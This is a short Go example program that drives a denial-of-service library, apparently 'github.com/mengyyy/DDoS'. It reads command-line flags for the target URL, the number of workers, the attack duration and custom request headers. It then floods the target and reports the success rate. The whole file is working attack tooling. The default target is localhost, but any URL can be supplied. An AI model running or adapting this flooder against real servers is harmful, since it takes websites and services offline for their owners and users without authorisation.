// Example

package main

import (
	"encoding/json"
	"flag"
	ddos "github.com/mengyyy/DDoS"
	"io/ioutil"
	"log"
	"time"
)

func main() {
	workers := flag.Int("w", 100, "worker num")
	targetUrl := flag.String("u", "http://127.0.0.1:80", "target url")
	workTime := flag.Int("t", 1, "how many  seconds attack keep")
	jsonConfig := flag.String("hc", "", "headers json congfig file path")
	flag.Parse()

	log.Println("start ~~~")
	log.Printf("worker | %d\n", *workers)
	log.Printf("target | %s", *targetUrl)
	log.Printf("keep   | %d Seconds\n", *workTime)

	headers := make(map[string]string)
	if len(*jsonConfig) > 0 {
		file, err := ioutil.ReadFile(*jsonConfig)
		if err != nil {
			log.Printf("File error: %v\n", err)
			panic(err)
		}
		json.Unmarshal(file, &headers)
		for k, v := range headers {
			log.Print(k, v)
		}
	}

	d, err := ddos.New(*targetUrl, *workers, headers)
	if err != nil {
		panic(err)
	}
	d.Run()
	time.Sleep(time.Duration(*workTime) * time.Second)
	d.Stop()
	log.Printf("DDoS attack server: %s\n", *targetUrl)
	// Output: DDoS attack server: http://127.0.0.1:80
	successCnt, amount := d.Result()
	rate := float64(successCnt) / float64(amount) * 100
	log.Printf("success %d\tamount %d\trate %.2f%%", successCnt, amount, rate)
}
